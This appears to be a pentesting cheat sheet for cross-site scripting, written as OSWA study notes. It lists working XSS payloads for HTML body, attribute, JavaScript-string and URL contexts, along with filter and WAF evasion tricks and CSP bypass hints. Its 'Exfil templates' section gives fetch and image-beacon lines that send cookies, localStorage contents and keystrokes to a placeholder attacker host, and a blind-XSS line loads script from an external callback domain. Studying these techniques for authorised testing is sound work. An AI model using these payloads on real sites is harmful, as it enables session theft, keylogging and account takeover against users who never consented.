---
category: OSWA Web App Pentesting
order: 2
summary: PoC payloads by injection context (HTML body, attribute, JS string, URL), filter/WAF evasion, CSP checks, and exfil templates.
---
# Cross-Site Scripting (XSS)

Payloads are organized by injection context — confirm context first.

## PoC payloads
```html
<script>alert(document.domain)</script>
```
Use `document.domain` (not a bare number) — tells you which origin fired when testing many params/iframes at once. If `alert` is filtered: `confirm(1)`, `prompt(1)`, `print()`.

## HTML body context (`<div>{input}</div>`)
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<iframe src="javascript:alert(1)">
```
`onerror`/`onload`/`ontoggle` fire without user interaction — good filter-bypass options when `<script>`/`<img>` specifically are blocklisted.

## HTML attribute context (`<input value="{input}">`)
```html
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
"><script>alert(1)</script>
```
Leading quote closes the value early → rest becomes a new attribute. `autofocus onfocus=` fires with zero interaction.

## JS string context (inline `<script>` block)
```js
';alert(1);'
';alert(1)//
'+alert(1)+'
```
Close the string (`'`) → terminate/comment the statement → reopen a dummy string so trailing app code still parses. Use `+alert(1)+` (expression, not statement) if `;` is filtered.

## URL / href / src context
```html
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

## When `innerHTML` won't run `<script>`
```html
<img src=x onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
```

## Filter / WAF evasion
| Trick | Example |
|---|---|
| Case variation | `<ScRiPt>`, `<IMG SRC=x ONERROR=alert(1)>` |
| No parens (tagged template) | ``<img src=x onerror=alert`1`>`` |
| No spaces (`/` as separator) | `<img/src=x/onerror=alert(1)>` |
| Uncommon tag/handler | `<body onpageshow=alert(1)>`, `<marquee onstart=alert(1)>` |
| Entity/URL encoding | `&#x3C;script&#x3E;`, `%3Cscript%3E` |
| Base64 (bypasses char-set limits, not keywords) | `eval(atob('BASE64'))` |

## Content-Security-Policy — check before assuming anything above fires
- `script-src 'self'` (no `'unsafe-inline'`) → inline `<script>`/`on*=` won't execute — need an allowed-origin file, a JSONP endpoint, or a bypass gadget.
- No CSP / `'unsafe-inline'` present → payloads above work as-is.
- `connect-src` locked down → exfil via `<img src=...>` if `img-src` is looser.

## Exfil templates
```js
fetch("http://ATTACKER/exfil?c=" + encodeURIComponent(document.cookie))
fetch("http://ATTACKER/exfil?d=" + encodeURIComponent(JSON.stringify(localStorage)))
document.addEventListener('keydown', e => fetch("http://ATTACKER/k?key=" + e.key))
new Image().src = "http://ATTACKER/exfil?d=" + encodeURIComponent(data)   // works even when img-src is open but connect-src isn't
```

## Blind XSS
Payload lands somewhere you can't observe (support ticket, internal dashboard). Use an out-of-band callback instead of `alert()`:
```html
<script src="https://YOUR-SUBDOMAIN.xss.ht"></script>
```

## Reference links
- [PortSwigger — XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- OWASP XSS Filter Evasion Cheat Sheet
- PayloadsAllTheThings — XSS Injection
